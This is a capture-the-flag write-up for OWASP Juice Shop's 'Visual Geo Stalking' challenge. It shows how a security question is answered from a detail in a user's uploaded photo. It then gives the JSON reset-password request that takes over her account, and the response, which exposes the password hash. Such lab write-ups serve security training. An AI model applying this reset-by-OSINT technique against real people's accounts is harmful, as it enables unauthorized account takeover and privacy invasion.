# Visual Geo Stalking

**Description**
Determine the answer to Emma's security question by looking at an upload of her to the Photo Wall and use it to reset her password via the Forgot Password mechanism.

Style: OSINT
Topic: Sensitive Data Exposure

## Solution

We first must find emma's username (email). Check it under `/#/administration` (Logged in as admin)

We found the username as `emma@juice-sh.op`

She has a photo at the `/#/photo-wall`, under user by the name "© E=ma²" and the title "My old workspace"
I tried google photo search...

Results are *This is a stately, white-façade 18th-century building located in Kenaupark, Haarlem.*

It didn't lead anywhere, so after a more careful look I saw that the company name `ITsec`

Went to the forget-password page

So I sent the following payload to `/rest/user/reset-password`

```json
{
    "email":"emma@juice-sh.op",
    "answer":"ITsec",
    "new":"12345",
    "repeat":"12345"
}
```

Response was `200 OK` with the following payload:

```json
{
    "user":{
        "id":19,
        "username":"E=ma²",
        "email":"emma@juice-sh.op",
        "password":"827ccb0eea8a706c4c34a16891f84e7b",
        "role":"customer",
        "deluxeToken":"",
        "lastLoginIp":"",
        "profileImage":"assets/public/images/uploads/default.svg",
        "totpSecret":"",
        "isActive":true,
        "createdAt":"2026-06-12T13:14:47.498Z",
        "updatedAt":"2026-06-12T18:36:40.181Z",
        "deletedAt":null
    }
}
```
Challenge solved!